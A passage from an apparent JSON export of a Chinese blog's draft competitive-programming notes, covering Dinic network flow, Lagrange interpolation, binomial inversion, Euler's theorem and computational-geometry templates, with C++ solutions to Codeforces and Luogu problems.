namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=0;\ntypedef pair<int,int> pii;\n#define _ 505\nint a[_],dp[_],siz=1,head[_],s,t;\nstruct Edge{int nxt,to,w;} edge[1000006];\ninline void _add(int u,int v,int w){edge[++siz].nxt=head[u],edge[siz].to=v,edge[siz].w=w,head[u]=siz;}\ninline void add(int u,int v,int w){_add(u,v,w),_add(v,u,0);}\nint dis[_],rad[_];\nbool bfs(){\n\tmemset(dis,0,sizeof(dis));dis[s]=1;\n\tqueue<int> q;q.push(s);\n\twhile(!q.empty()){\n\t\tint now=q.front();q.pop();\n\t\trad[now]=head[now];\n\t\tfor(int i=head[now];i;i=edge[i].nxt){\n\t\t\tint to=edge[i].to;\n\t\t\tif(!dis[to]&&edge[i].w) dis[to]=dis[now]+1,q.push(to);\n\t\t}\n\t}\n\treturn dis[t]!=0;\n}\nint dfs(int now,int rem){\n\tif(now==t) return rem;\n\tint tmp=rem;\n\tfor(int i=rad[now];i;i=edge[i].nxt){\n\t\tint to=edge[i].to;rad[now]=i;\n\t\tif(dis[to]==dis[now]+1&&edge[i].w){\n\t\t\tint k=min(edge[i].w,tmp);\n\t\t\tint d=dfs(to,k);\n\t\t\tedge[i].w-=d,edge[i^1].w+=d;\n\t\t\ttmp-=d;\n\t\t\tif(!tmp) break;\n\t\t}\n\t}\n\treturn rem-tmp;\n}\ninline void subtask(){\n    int n;cin>>n;\n    for(int i=1;i<=n;i++) cin>>a[i];\n    for(int i=1;i<=n;i++) dp[i]=1;\n    int maxx=1;\n    for(int i=2;i<=n;i++) for(int j=1;j<i;j++) if(a[j]<=a[i]) dp[i]=max(dp[i],dp[j]+1),maxx=max(maxx,dp[i]);\n    cout<<maxx<<endl;\n    if(maxx==1) return cout<<n<<endl<<n,void();\n    s=0,t=2*n+1;\n    int e1,en;\n    for(int i=1;i<=n;i++){\n        add(2*i-1,2*i,1);\n        if(i==1) e1=siz-1;\n        if(i==n) en=siz-1;\n        if(dp[i]==1) add(s,2*i-1,inf);\n        if(dp[i]==maxx) add(2*i,t,inf);\n        for(int j=1;j<i;j++){\n            if(!(a[j]<=a[i]&&dp[j]==dp[i]-1)) continue;\n            add(2*j,2*i-1,1);\n        }\n    }\n    int ans=0;\n    while(bfs()) ans+=dfs(s,inf);\n    cout<<ans<<endl;\n    edge[e1].w=inf;\n    edge[en].w=inf;\n    while(bfs()) ans+=dfs(s,inf);\n    cout<<ans;\n}\nsigned main(){\n    ios::sync_with_stdio(false);\n    int t=1;//cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n","summary":"图论的补充内容的学习笔记，主要涵盖欧拉路和网络流相关内容","key":["欧拉路","网络流"],"tags":[],"path":["算法竞赛","知识点","图论(新).md"],"background":"https://pic.caiwen.work/i/2025/01/22/67909e51b8f1c.jpg","recommend":false,"status":"draft"},{"type":"Article","title":"多项式","id":"duoxiangshi","createTime":"2025-02-22T10:36:29.031Z","updateTime":"2025-09-05T13:34:05.862Z","content":"\n## 拉格朗日插值\n\n### 朴素做法\n\n$n+1$ 个点可以确定一个 $n$ 次多项式。拉格朗日插值可以实现，对于某个 $n$ 次多项式函数 $f(x)$ ，如果我们已知了这 $n+1$ 个点，就可以 $O(n^2)$ 的时间复杂度求出 $f(k)$\n\n具体来说，我们我们知道了多项式函数上的 $n+1$ 个点 $(x_i,y_i)$，然后有公式：\n\n$$\nf(k)=\\sum_{i=1}^{n+1} y_i \\prod_{j\\neq i} \\frac{k-x_j}{x_i-x_j}\n$$\n\n### 点为连续情况\n\n如果 $x_i$ 是连续的，比如 $x_1=1,x_2=2,...,x_i=i$，那么我们可以通过预处理，$O(n)$ 的时间复杂度求出 $f(k)$\n\n首先预处理出阶乘 $fac_i$ 以及阶乘逆元，然后对于要求出的点 $k$，预处理出下面两值：\n\n$$\npre_i=\\prod_{j=1}^i k-j\n$$\n\n$$\nsuf_i=\\prod_{j=i}^{n+1}k-j\n$$\n\n然后有公式：\n\n$$\nf(k)=\\sum_{i=1}^{n+1}y_i\\frac{pre_{i-1}\\times suf_{i+1}}{fac_{i-1}\\times fac_{n+1-i}\\times (-1)^{n+1-i}}\n$$\n\n### 题目\n\n#### F. The Sum of the k-th Powers\n\nhttps://codeforces.com/problemset/problem/622/F\n\n**题目描述**\n\n求 $(\\sum_{i=1}^ni^k)\\pmod{10^9+7}$\n\n**数据范围**\n\n$1\\le n \\le 10^9$，$0\\le k \\le 10^6$\n\n**笔记**\n\n$k$ 次方求和，求和公式是 $k+1$ 次的，我们先暴力算出 $k+2$ 个点，然后插值即可\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=1e9+7;\ntypedef pair<int,int> pii;\n#define _ 2000006\nint fac[_],inv[_],pre[_],suf[_],y[_];\ninline int qpow(int a,int p,int res=1){for(;p;p>>=1,a=a*a%mod)if(p&1)res=res*a%mod;return res;}\ninline void subtask(){\n    fac[0]=1;\n    for(int i=1;i<=2000000;i++) fac[i]=fac[i-1]*i%mod;\n    int n,k;cin>>n>>k;\n    for(int i=1;i<=k+2;i++) y[i]=(y[i-1]+qpow(i,k))%mod;\n    pre[0]=1;\n    for(int i=1;i<=k+2;i++) pre[i]=pre[i-1]*(n-i)%mod;\n    suf[k+3]=1;\n    for(int i=k+2;i>=1;i--) suf[i]=suf[i+1]*(n-i)%mod;\n    int ans=0;\n    for(int i=1;i<=k+2;i++) ans+=((k+2-i)%2==0?1:-1)*y[i]*pre[i-1]%mod*suf[i+1]%mod*qpow(fac[i-1],mod-2)%mod*qpow(fac[k+2-i],mod-2)%mod,ans%=mod;\n    cout<<(ans+mod)%mod;\n}\nsigned main(){\n    ios::sync_with_stdio(false);\n    int t=1;//cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n#### P4593 [TJOI2018] 教科书般的亵渎\n\nhttps://www.luogu.com.cn/problem/P4593\n\n**题目描述**\n\n现在有 $1\\sim n$，共 $n$ 个数字，然后去掉其中 $m$ 个数字。然后每次操作，都可以让所有的数字减一，如果减完之后有数字变为 $0$，则去掉该数字，然后再把所有的数字减一，由数字归零引发的减一也算在这次操作中。我们设 $k$ 为需要多少次操作才能把所有的数字归零。每次操作，对于每个数字，都会产生 $x^k$ 的分数，其中 $x$ 为减一之前的数字。\n\n求出把所有数字归零后，获得的总分数。多组测试数据\n\n**数据范围**\n\n- 对于 $10\\%$ 的数据，有 $m=0$；\n- 对于 $20\\%$ 的数据，有 $m\\leq1$；\n- 对于 $30\\%$ 的数据，有 $m\\leq2$\n- 对于 $40\\%$ 的数据，有 $m\\leq3$；\n- 对于 $50\\%$ 的数据，有 $m\\leq4$；\n- 对于 $60\\%$ 的数据，有 $m\\leq5$；\n- 对于 $100\\%$ 的数据，有 $m\\leq50$，$n\\leq10^{13}$，$1 \\le a_i <n$。\n\n**笔记**\n\n首先需要看出 $k=m+1$，手推几个样例然后感性理解一下就能得出来了\n\n去掉数字后，会把 $1\\sim n$ 分成若干数字连续的段\n\n然后我们把贡献拆开，对于一个数字，考虑他会对总分数产生什么样的贡献。设被去掉的数字为 $a_i$，然后设 令 $a_0=0$，我们发现数字 $x$ 对答案的贡献为 $\\sum_{i=0}^m(x-a_i)^k$，其中只计算小于 $x$ 的 $a_i$。手推几个样例然后感性理解一下就能得出来了\n\n我们又发现，如果 $a_i$ 固定，$x$ 在某个区间上连续变化的话，$x-a_i$ 也是连续变化的，$(x-a_i)^k$ 就可以像上道题那样求出\n\n于是答案变为了 $\\sum_{i=0}^m\\sum_{x=l_j}^{r_j} (x-a_i)^k$\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=1e9+7;\ntypedef pair<int,int> pii;\nint fac[66],inv[66],y[66],n,m,pre[66],suf[66];\ninline int qpow(int a,int p,int res=1){for(;p;p>>=1,a=a*a%mod)if(p&1)res=res*a%mod;return res;}\ninline void subtask(){\n    cin>>n>>m;\n    vector<int> ve;\n    for(int i=1,x;i<=m;i++) cin>>x,ve.push_back(x);\n    ve.push_back(0);sort(ve.begin(),ve.end());\n    int end=n;\n    for(int i=ve.size()-1;i>=0;i--) if(ve[i]==end) m--,end--,n--;\n    int k=m+1;\n    for(int i=1;i<=k+2;i++) y[i]=(y[i-1]+qpow(i,k))%mod;\n    auto f=[k](int x){\n        if(x==0) return (long long)0;\n        pre[0]=1;\n        for(int i=1;i<=k+2;i++) pre[i]=pre[i-1]*(x-i)%mod;\n        suf[k+3]=1;\n        for(int i=k+2;i>=1;i--) suf[i]=suf[i+1]*(x-i)%mod;\n        int res=0;\n        for(int i=1;i<=k+2;i++) res+=((k+2-i)%2==0?1:-1)*y[i]*pre[i-1]%mod*suf[i+1]%mod*inv[i-1]%mod*inv[k+2-i]%mod,res%=mod;\n        return (res+mod)%mod;\n    };\n    auto flr=[f](int l,int r){return (f(r)-f(l-1)+mod)%mod;};\n\n    vector<pii> ran;\n    int l=1;\n    for(auto x:ve){\n        if(!x) continue;\n        if(x==l) l++;\n        else{\n            ran.push_back(pii(l,x-1));\n            l=x+1;\n        }\n    }\n    if(l<=n) ran.push_back(pii(l,n));\n    int res=0;\n    for(auto to:ran){\n        for(auto x:ve){\n            if(x>to.first) break;\n            res+=flr(to.first-x,to.second-x);res%=mod;\n        }\n    }\n    cout<<res<<endl;\n}\nsigned main(){\n    fac[0]=1;\n    for(int i=1;i<=60;i++) fac[i]=fac[i-1]*i%mod;\n    inv[60]=qpow(fac[60],mod-2);\n    for(int i=60-1;i>=0;i--) inv[i]=inv[i+1]*(i+1)%mod;\n    ios::sync_with_stdio(false);\n    int t;cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n","summary":"算法竞赛中多项式相关知识的学习笔记及相关题目","key":["数学","多项式","插值"],"tags":[],"path":["算法竞赛","知识点","多项式.md"],"background":"http://pic.caiwen.work/i/2025/04/03/67ee613de9894.png","recommend":false,"status":"draft"},{"type":"Article","title":"组合数学(新)","id":"new_zuhe","createTime":"2025-02-21T12:57:56.178Z","updateTime":"2025-09-05T13:34:06.048Z","content":"\n## 容斥\n\n### 二项式反演\n\n我们令 $f(i)$ 表示至少 $i$ 个元素满足某个条件，其他元素随便的方案数。$g(i)$ 表示恰好 $i$ 个元素满足某个条件的方案数。一般 $f(i)$ 很好求出，但我们想求 $g(i)$，就可以使用二项式反演：\n\n形式一：\n\n$$\nf(n)=\\sum_{i=0}^n C_n^i \\space  g(i)\\Longleftrightarrow g(n)=\\sum_{i=0}^n(-1)^{n-i}\\space C_n^i\\space f(i)\n$$\n\n形式二：\n\n$$\nf(n)=\\sum_{i=n}^m C_i^n \\space  g(i)\\Longleftrightarrow g(n)=\\sum_{i=n}^m(-1)^{i-n}\\space C_i^n\\space f(i)\n$$\n\n#### 题目\n\n##### P4071 [SDOI2016] 排列计数\n\nhttps://www.luogu.com.cn/problem/P4071\n\n**题目描述**\n\n求有多少种 $1$ 到 $n$ 的排列 $a$，满足序列恰好有 $m$ 个位置 $i$，使得 $a_i = i$。\n\n答案对 $10^9 + 7$ 取模。多组测试数据\n\n**数据范围**\n\n对于全部的测试点，保证 $1 \\leq T \\leq 5 \\times 10^5$，$1 \\leq n \\leq 10^6$，$0 \\leq m \\leq 10^6$。\n\n**笔记**\n\n令 $f(x)$ 表示为有 $x$ 个位置满足 $a_i=i$，剩下的位置随便放，那么就有 $f(x)=C_n^x\\space (n-x)!=\\frac{n!}{x!}$\n\n但是 $f(x)$ 表示的是至少有 $x$ 个位置满足要求，可能满足要求的位置不止 $x$ 个，我们要求的是恰好 $x$ 个位置，那么令恰好 $x$ 个位置满足要求的方案数为 $g(x)$，有\n\n$$\nf(x)=\\sum_{i=x}^n C_i^x \\space  g(i)\n$$\n\n反演：\n\n$$\n\\begin{align}\ng(x)&=\\sum_{i=x}^n(-1)^{i-x}\\space C_i^x\\space f(i) \\\\\n&=\\sum_{i=x}^n(-1)^{i-x}\\space \\frac{i!}{(i-x)!x!}\\space \\frac{n!}{i!} \\\\\n&=\\frac{n!}{x!}\\sum_{i=0}^{n-x}\\frac{(-1)^i}{i!}\n\\end{align}\n$$\n\n后面那个求和式可以提前预处理出来，于是我们就可以 $O(1)$ 回答每个询问\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=1e9+7;\n#define _ 1000006\ntypedef pair<int,int> pii;\nint fac[_],inv[_],pre[_];\ninline int qpow(int a,int p,int res=1){for(;p;a=a*a%mod,p>>=1) if(p&1) res=res*a%mod;return res;}\ninline void init(){\n    fac[0]=1;\n    for(int i=1;i<=1000000;i++) fac[i]=fac[i-1]*i%mod;\n    inv[1000000]=qpow(fac[1000000],mod-2);\n    for(int i=1000000-1;i>=0;i--) inv[i]=inv[i+1]*(i+1)%mod;\n    pre[0]=1;\n    for(int i=1;i<=1000000;i++) pre[i]=(pre[i-1]+(i%2==0?1:-1)*inv[i]+mod)%mod;\n}\ninline void subtask(){\n    int n,m;cin>>n>>m;\n    cout<<fac[n]*inv[m]%mod*pre[n-m]%mod<<endl;\n}\nsigned main(){\n    init();\n    ios::sync_with_stdio(false);\n    int t;cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n##### P10596 BZOJ2839 集合计数\n\nhttps://www.luogu.com.cn/problem/P10596\n\n**题目描述**\n\n一个有 $N$ 个元素的集合有 $2^N$ 个不同子集（包含空集），现在要在这 $2^N$ 个集合中取出若干集合（至少一个），使得它们的交集的元素个数为 $K$，求取法的方案数，答案模 $10^9+7$。\n\n**数据范围**\n\n对于 $100\\%$ 的数据，$1\\leq N\\leq 1000000$，$0\\leq K\\leq N$。\n\n**笔记**\n\n设 $f(x)$ 表示交集元素数量至少为 $x$ 的方案数，那么有 $f(x)=C_n^x\\space(2^{2^{n-x}}-1)$ （先选出这 $x$ 个数，然后剩下的 $n-x$ 个数构成 $2^{n-x}$ 个集合，这些集合随便选，但不能一个都不选）\n\n设 $g(x)$ 表示交集元素数量恰好为 $x$ 的方案数，则有 $f(x)=\\sum_{i=x}^n C_i^x\\space g(i)$\n\n反演，有 $g(x)=\\sum_{i=x}^nC_i^x\\space (-1)^{i-x}f(i)$\n\n直接求即可，其中求 $f(x)$ 的时候需要用到扩展欧拉定理\n\n##### 已经没有什么好害怕的了\n\n[https://vjudge.net/problem/黑暗爆炸-3622](https://vjudge.net/problem/黑暗爆炸-3622)\n\n**题目描述**\n\n给出长度为 $n$ 的数组 $a$ 和 $b$，这 $2n$ 个数字互不相同。现在让 $a$ 中的数字和 $b$ 中的数字两两配对，使得 $a$ 中大于 $b$ 中的对数比 $b$ 中大于 $a$ 中的对数恰好多 $k$ 个，求方案数\n\n**数据范围**\n\n$1\\le n \\le 2000$\n\n**笔记**\n\n显然可以转化为要求配对出恰好 $\\frac{n+k}{2}$ 个 $a$ 比 $b$ 大的组，如果 $n$ 和 $k$ 不同奇偶则无解\n\n首先对 $a$ 中的数字进行排序，然后求得一个数组 $c$，$c_i$ 表示 $b$ 中有多少个数字可以小于 $a_i$。我们发现，如果 $i<j$，那么比 $a_i$ 小的数字一定比 $a_j$ 小，或者说如果我们给 $a_i$ 配对某个数之后，再考虑可供与 $a_j$ 配对的数字个数时，可以用 $c_j$ 减去当前已知匹配出来的组数。\n\n于是就有 $dp[i][j]$ 表示前 $i$ 个数字匹配出来了 $j$ 组，$dp[i][j]=dp[i-1][j]+dp[i-1][j-1]*(c_j-j+1)$\n\n再深入考虑一下 $dp[i][j]$ 的含义，我们是钦定了 $j$ 组，对于其他位置，我们还没有考虑怎么分配\n\n令 $f(x)=(n-x)!\\times dp[n][x]$，也就是我们把其余 $n-x$ 个位置随便配对，这些位置既可能是 $a$ 比 $b$ 大，也可能是 $b$ 比 $a$ 大，于是 $f(x)$ 就变成了至少有 $x$ 组 $a$ 比 $b$ 大的方案数。但我们要求恰好 $x$ 组的方案数，于是走个二项式反演就齐活了\n\n```cpp\n#include<bits/stdc++.h>\n#define int long long\n#define ull unsigned long long\n#define ls(k) (k)<<1\n#define rs(k) (k)<<1|1\n#define debug(x) cout<<#x<<\"=\"<<x<<endl\nusing namespace std;\nconst int inf=0x3f3f3f3f3f3f3f3f;\nconst int mod=1e9+9;\n#define _ 2003\ntypedef pair<int,int> pii;\nint a[_],b[_],c[_],dp[_][_],fac[_],inv[_],n,k;\ninline int qpow(int a,int p,int res=1){for(;p;p>>=1,a=a*a%mod) if(p&1) res=res*a%mod;return res;}\ninline int con(int n,int m){return fac[n]*inv[m]%mod*inv[n-m]%mod;};\ninline int f(int x){return fac[n-x]*dp[n][x]%mod;};\ninline void subtask(){\n    cin>>n>>k;\n    if((n+k)%2) return cout<<0,void();\n    fac[0]=1;for(int i=1;i<=n;i++) fac[i]=fac[i-1]*i%mod;\n    inv[n]=qpow(fac[n],mod-2);for(int i=n-1;i>=0;i--) inv[i]=inv[i+1]*(i+1)%mod;\n    for(int i=1;i<=n;i++) cin>>a[i];\n    for(int i=1;i<=n;i++) cin>>b[i];\n    sort(a+1,a+n+1);\n    for(int i=1;i<=n;i++) for(int j=1;j<=n;j++) if(b[j]<a[i]) c[i]++;\n    dp[0][0]=1;\n    for(int i=1;i<=n;i++){\n        dp[i][0]=1;\n        for(int j=1;j<=i;j++){\n            dp[i][j]=(dp[i-1][j]+dp[i-1][j-1]*max(c[i]-j+1,(int)0)%mod)%mod;\n        }\n    }\n    int ans=0,x=(n+k)/2;\n    for(int i=x;i<=n;i++) ans+=con(i,x)*((i-x)%2==1?-1:1)*f(i)%mod,ans%=mod;\n    cout<<(ans+mod)%mod;\n}\nsigned main(){\n    ios::sync_with_stdio(false);\n    int t=1;//cin>>t;\n    while(t--) subtask();\n    return 0;\n}\n```\n\n","summary":"组合数学的补充笔记，目前主要涵盖了二项式反演相关内容","key":["组合数学","容斥","二项式反演"],"tags":[],"path":["算法竞赛","知识点","组合数学(新).md"],"background":"https://pic.caiwen.work/i/2025/01/22/67909e51b8f1c.jpg","recommend":false,"status":"draft"},{"type":"Article","title":"数论(新)","id":"new_shulun","createTime":"2025-02-21T12:13:40.691Z","updateTime":"2025-09-05T13:34:06.002Z","content":"\n### 费马小定理\n\n若 $p$ 为素数，$gcd(a,p)=1$ ，则 $a^{p-1} \\equiv 1 \\pmod{p} $\n\n### 欧拉定理\n\n若 $gcd(a,m)=1$，则 $a^{\\varphi(m)}\\equiv 1\\pmod m$\n\n### 扩展欧拉定理\n\n主要用于解决幂次很大时的取模\n\n按底数 $a$ 和模数 $p$ 的关系分情况（与指数是多少无关）\n\n1. 若 $gcd(a,p)=1$，则 $a^{b}\\equiv a^{b\\mod{\\varphi(p)}}\\pmod p$\n2. 若 $gcd(a,p)\\neq 1$，则\n\n$$\na^b\\equiv\n\\begin{cases}\na^b, & b<\\varphi(p)\\\\\na^{(b\\mod \\varphi(p))+\\varphi(p)}, &b\\ge \\varphi(p)\n\\end{cases}\n\\pmod p\n$$\n\n","summary":"数论相关内容重新整理，草稿","key":["数论"],"tags":[],"path":["算法竞赛","知识点","数论(新).md"],"background":"https://pic.caiwen.work/i/2025/01/22/67909e51b8f1c.jpg","recommend":false,"status":"draft"},{"type":"Article","title":"计算几何","id":"jisuanjihe","createTime":"2025-02-08T09:48:58.332Z","updateTime":"2025-09-05T13:34:05.906Z","content":"\n## 基础\n\n### 圆周率\n\n```cpp\nconst double pi=acos(-1);\n```\n\n### 偏差值\n\n```cpp\nconst double eps=1e-8;\n```\n\n一般取 1e-8，再小可能就出问题了\n\n### 符号函数\n\n```cpp\ninline int sgn(double x){return fabs(x)<=eps?0:(x>0?1:-1);}\n```\n\n### 浮点数输出\n\n当输出浮点数的 0 时，可能会出现输出了 `-0.00000...` 的情况，某些题目中需要特判：\n\n```cpp\ninline double fit(double x){return sgn(x)==0?0:x;}\n```\n\n### 精度问题\n\n1. 能整数解决的问题就不要使用浮点数。同时注意，如果运算过程中都是整数，但还是用double类型，还是会发生精度损失\n2. 使用 long double 减少精度损失\n3. 把所有数放大 1000 倍减少精度损失\n\n## 点\n\n### 表示\n\n```cpp\nstruct Point{\n    double x,y;\n    Point(){}\n    Point(double x,double y):x(x),y(y){}\n};\n```\n\n### 两点距离公式\n\n```cpp\ninline double dis(Point a,Point b){return hypot(a.x-b.x,a.y-b.y);}\n```\n\n### 判等\n\n```cpp\nbool operator==(Point b){return sgn(x-b.x)==0&&sgn(y-b.y)==0;}\n```\n\n## 向量\n\n### 表示\n\n可以直接用点来表示向量。把所有向量视为起点为原点\n\n```cpp\ntypedef Point Vector;\n```\n\n### 向量运算\n\n```cpp\nPoint operator+(Point b){return Point(x+b.x,y+b.y);}\nPoint operator-(Point b){return Point(x-b.x,y-b.y);}\nPoint operator*(double k){return Point(x*k,y*k);}\nPoint operator/(double b){return Point(x/k,y/k);}\n```\n\n### 点积\n\n```cpp\ndouble operator*(Point b){return x*b.x+y*b.y;}\n```\n\n#### 求向量模长\n\n```cpp\ninline double len(Point a){return sqrt(a*a);}\n```\n\n有时开方会损失精度，可以改为求长度的平方\n\n```cpp\ninline double len2(Point a){return a*a;}\n```\n\n#### 夹角\n\n返回的是 cos 值\n\n```cpp\ninline double angle(Point a,Point b){return a*b/len(a)/len(b);}\n```\n\n### 叉积\n\n```cpp\ndouble operator^(Point b){return x*b.y-y*b.x;}\n```\n\n#### 面积\n\n以 a 为 公共点，b 到 c 的有向面积\n\n```cpp\ninline double area(Point a,Point b,Point c){return (b-a)^(c-a);}\n```\n\n#### 向量旋转与法向量\n\n向量 $(x,y)$ 绕原点逆时针旋转度数 $\\theta$，得到向量 $(x',y')$，有如下关系：\n\n$$\nx'=x \\cos \\theta - y \\sin \\theta \\\\\ny'=x \\sin \\theta + y \\cos \\theta\n$$\n\n```cpp\ninline Point rotate(Point a,double rad){return Point(a.x*cos(rad)-a.y*sin(rad),a.x*sin(rad)+a.y*cos(rad));}\n```\n\n法向量为向量逆时针旋转 $90^{\\circ} $\n\n```cpp\ninline Point normal(Point a){return Point(-a.y/len(a),a.x/len(a));}\n```\n\n## 线\n\n### 表示\n\n```cpp\nstruct Line{\n    Point s,t;\n    Line(){}\n    Line(Point s,Point t):s(s),t(t){}\n};\n```\n\n### 斜率\n\n```cpp\ninline double slope(Point a,Point b){return (a.y-b.y)/(a.x-b.x);}\n```\n\n### 倾斜角\n\n```cpp\ninline double angle(Line l){\n    double k=atan2(l.s.y-l.t.y,l.s.x-l.t.x);\n    if(sgn(k)<0) k+=pi;\n    if(sgn(k-pi)==0) k=pi;\n    return k;\n}\n```\n\n### 点与线\n\n#### 点与直线位置\n\n点在直线左边还是右边需要看你是从直线哪个方向观察的，这里传递的线段应视为有向线段，从 s 指向 t\n\n```cpp\ninline int plr(Point p,Line l){//0:on -1:left 1:right\n    int k=sgn((l.t-l.s)^(p-l.s));\n    if(k>0) return -1;\n    if(k<0) return 1;\n    return 0;\n}\n```\n\n#### 点是否在线段上\n\n先用叉积判断是否共线，再用点积判断是否在线段上\n\n```cpp\ninline bool on_seg(Point p,Line l){return plr(p,l)==0&&sgn((p-l.s)*(p-l.t))<=0;}\n```\n\n#### 点到直线距离\n\n先叉积求出构成的平行四边形面积，然后面积除以底就得到了高，即点到直线距离\n\n```cpp\ninline double dis(Point p,Line l){return fabs((p-l.s)^(l.s-l.t)/dis(l.s,l.t));}\n```\n\n#### 点在直线上投影\n\n```cpp\ninline Point proj(Point p,Line l){return l.s+(l.t-l.s)*(l.t-l.s)*(p-l.s)/len2(l.t-l.s);}\n```\n\n#### 点关于直线对称\n\n```cpp\ninline Point symmetry(Point p,Line l){return 2*proj(p,l)-p;}\n```\n\n#### 点到线段距离\n\n过点向线段所在直线作垂线，如果垂足落在线段上，那么点到线段的距离为点到直线距离，反之，则为点到线段两端点的最小值\n\n```cpp\ninline double dis_seg(Point p,Line l){\n    if(sgn((p-l.s)*(l.t-l.s))<0||sgn((p-l.t)*(l.s-l.t))<0) return min(dis(p,l.s),dis(p,l.t));\n    return dis(p,l);\n}\n```\n\n### 线与线\n\n#### 两直线位置关系\n\n平行、重合、相交\n\n```cpp\ninline int llr(Line l1,Line l2){//0:平行 1:相交 2:重合\n    if(sgn((l1.s-l1.t)^(l2.s-l2.t))==0){\n        if(plr(l1.s,l2)==0) return 2;\n        else return 0;\n    }\n    return 1;\n}\n```\n\n#### 两线段位置关系\n\n返回值如下：\n\n0. 不相交\n1. 非规范相交：交点在端点上\n2. 规范相交：交点在线段内部\n\n```cpp\ninline int ssr(Line l1,Line l2){//0:不相交 1:非规范相交 2:规范相交\n    int c1=plr(l1.s,l2),c2=plr(l1.t,l2);\n    int d1=plr(l2.s,l1),d2=plr(l2.t,l1);\n    if(c1*c2<0&&d1*d2<0) return 2;\n    return (c1==0&&on_seg(l1.s,l2))||(c2==0&&on_seg(l1.t,l2))||(d1==0&&on_seg(l2.s,l1))||(d2==0&&on_seg(l2.t,l1));\n}\n```\n\n#### 线段和直线关系\n\n返回值：\n\n0. 不相交\n\n1. 非规范相交\n2. 规范相交\n3. 重合\n\n```cpp\ninline int slr(Line s,Line l){//0:不相交 1:非规范相交 2:规范相交 3:重合\n    int d1=plr(s.s,l),d2=plr(s.t,l);\n    if(d1==0&&d2==0) return 3;\n    if(d1*d2==0) return 1;\n    if(d1*d2<0) return 2;\n    return 0;\n}\n```\n\n#### 两直线交点\n\n调用该函数前应确保两条直线存在交点\n\n```cpp\ninline Point cp(Line l1,Line l2){\n    double s1=(l1.t-l1.s)^(l2.s-l1.s);\n    double s2=(l1.t-l1.s)^(l2.t-l1.s);\n    return (l2.s*s2-l2.t*s1)/(s2-s1);\n}\n```\n\n#### 线段与线段距离\n\n设 $P_0$ 和 $P_1$ 构成线段 $L_1$，$P_2$ 和 $P_3$ 构成线段 $L_2$，则 $L_1$ 和 $L_2$ 的距离为：\n\n- 如果 $L_1$ 和 $L_2$ 相交，则为 0\n- 反之，则为 $P_0$ 到 $L_2$ ，$P_1$ 到 $L_2$，$P_2$ 到 $L_1$，$P_3$ 到 $L_1$ ，四者距离的最小值\n\n## 基础点线模板汇总\n\n```cpp\nconst double pi=acos(-1);\nconst double eps=1e-8;\ninline int sgn(double x){return fabs(x)<=eps?0:(x>0?1:-1);}\ninline double fit(double x){return sgn(x)==0?0:x;}\nstruct Point{\n    double x,y;\n    Point(){}\n    Point(double x,double y):x(x),y(y){}\n    Point operator+(const Point& b) const {return Point(x + b.x, y + b.y);}\n    Point operator-(const Point& b) const {return Point(x - b.x, y - b.y);}\n    Point operator*(double k) const {return Point(x * k, y * k);}\n    double operator*(const Point& b) const {return x * b.x + y * b.y;}\n    Point operator/(double k) const {return Point(x / k, y / k);}\n    double operator^(const Point& b) const {return x * b.y - y * b.x;}\n};\ntypedef Point Vector;\nstruct Line{\n    Point s,t;\n    Line(){}\n    Line(Point s,Point t):s(s),t(t){}\n};\ninline double dis(Point a,Point b){return hypot(a.x-b.x,a.y-b.y);}\ninline double dis(Point p,Line l){return fabs((p-l.s)^(l.s-l.t)/dis(l.s,l.t));}\ninline double len(Point a){return sqrt(a*a);}\ninline double len2(Point a){return a*a;}\ninline double slope(Point a,Point b){return (a.y-b.y)/(a.x-b.x);}\ninline double angle(Point a,Point b){return a*b/len(a)/len(b);}\ninline double angle(Line l){\n    double k=atan2(l.s.y-l.t.y,l.s.x-l.t.x);\n    if(sgn(k)<0) k+=pi;\n    if(sgn(k-pi)==0) k=pi;\n    return k;\n}\ninline double area(Point a,Point b,Point c){return (b-a)^(c-a);}//a为公共点，b到c有向面积\ninline Point rotate(Point a,double rad){return Point(a.x*cos(rad)-a.y*sin(rad),a.x*sin(rad)+a.y*cos(rad));}\ninline Point normal(Point a){return Point(-a.y/len(a),a.x/len(a));}//逆时针旋转90度的法向量\ninline int plr(Point p,Line l){//0:on -1:left 1:right\n    int k=sgn((l.t-l.s)^(p-l.s));\n    if(k>0) return -1;\n    if(k<0) return 1;\n    return 0;\n}\ninline bool on_seg(Point p,Line l){return plr(p,l)==0&&sgn((p-l.s)*(p-l.t))<=0;}\ninline Point proj(Point p,Line l){return l.s+(l.t-l.s)*((l.t-l.s)*(p-l.s))/len2(l.t-l.s);}\ninline Point symmetry(Point p,Line l){return proj(p,l)*2-p;}\ninline double dis_seg(Point p,Line l){\n    if(sgn((p-l.s)*(l.t-l.s))<0||sgn((p-l.t)*(l.s-l.t))<0) return min(dis(p,l.s),dis(p,l.t));\n    return dis(p,l);\n}\ninline int llr(Line l1,Line l2){//0:平行 1:相交 2:重合\n    if(sgn((l1.s-l1.t)^(l2.s-l2.t))==0){\n        if(plr(l1.s,l2)==0) return 2;\n        else return 0;\n    }\n    return 1;\n}\ninline int ssr(Line l1,Line l2){//0:不相交 1:非规范相交 2:规范相交\n    int c1=plr(l1.s,l2),c2=plr(l1.t,l2);\n    int d1=plr(l2.s,l1),d2=plr(l2.t,l1);\n    if(c1*c2<0&&d1*d2<0) return 2;\n    return (c1==0&&on_seg(l1.s,l2))||(c2==0&&on_seg(l1.t,l2))||(d1==0&&on_seg(l2.s,l1))||(d2==0&&on_seg(l2.t,l1));\n}\ninline int slr(Line s,Line l){//0:不相交 1:非规范相交 2:规范相交 3:重合\n    int 